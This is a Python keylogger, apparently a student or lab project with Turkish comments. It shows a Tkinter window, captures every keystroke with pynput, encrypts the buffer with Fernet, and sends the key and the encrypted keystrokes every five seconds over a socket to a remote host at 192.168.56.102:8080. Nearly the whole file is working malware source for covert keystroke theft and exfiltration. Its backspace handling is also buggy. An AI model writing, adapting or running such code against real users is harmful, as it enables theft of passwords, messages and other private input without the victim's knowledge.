import tkinter as tk
import pynput
from cryptography.fernet import Fernet
import threading
import socket
import time

# Anahtar oluşturma veya mevcut bir anahtarı yükleme
def generate_key():
    return Fernet.generate_key()

# Veriyi şifreleme
def encrypt_data(key, data):
    cipher_suite = Fernet(key)
    encrypted_data = cipher_suite.encrypt(data.encode())
    return encrypted_data

# Anahtar oluştur
key = generate_key()
print(key)
toplama = ""


def send_data():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.56.102", 8080))  # Sunucu IP adresi ve port numarası
        s.send(key)

        while True:
            encrypted = encrypt_data(key, toplama)
            s.send(encrypted)  # Şifrelenmiş veriyi gönder
            time.sleep(5)  # 2 saniye bekleme

    except Exception as e:
        print("Hata:", e)
    

def emir(harfler):
    global toplama
    try:
        toplama += str(harfler.char)
    except AttributeError:
        if harfler == harfler.space:
            toplama += " "
        elif harfler == harfler.backspace:
            cikarilan = len(toplama) - 1
            if cikarilan >= 0:
                cikarilacak = toplama[cikarilan]
                yeni_metin = ""
                for karakter in toplama:
                    if karakter != cikarilacak:
                        yeni_metin += karakter
                toplama = yeni_metin
        elif harfler == harfler.enter:
            toplama += "\n"
    
    # Veriyi şifrele
    encrypted = encrypt_data(key, toplama)
    print("Şifrelenmiş Veri:", encrypted)
    # Şifrelenmiş veriyi görmek için konsola yazdırabilirsiniz

    print(toplama)

def dinleme():
    dinleme = pynput.keyboard.Listener(on_press=emir)
    with dinleme:
        dinleme.join()

def guncelle_buton_metni():
    baslat_dugme.config(text=f"Anahtar: {key}")

def update_label():
    global toplama
    label.config(text=toplama)
    label.after(1, update_label)

pencere = tk.Tk()
pencere.geometry("600x400")
pencere.title("Keylogger")

label = tk.Label(pencere, text='KALI_SNIFFER')
label.pack()

baslat_dugme = tk.Button(pencere, text="Keylogger'ı Başlat", command=lambda: threading.Thread(target=dinleme).start())
baslat_dugme.pack()

thread2 = threading.Thread(target=update_label)
thread2.start()
guncelle_buton_metni()


thread_send_data = threading.Thread(target=send_data)
thread_send_data.daemon = True  
thread_send_data.start()

pencere.mainloop()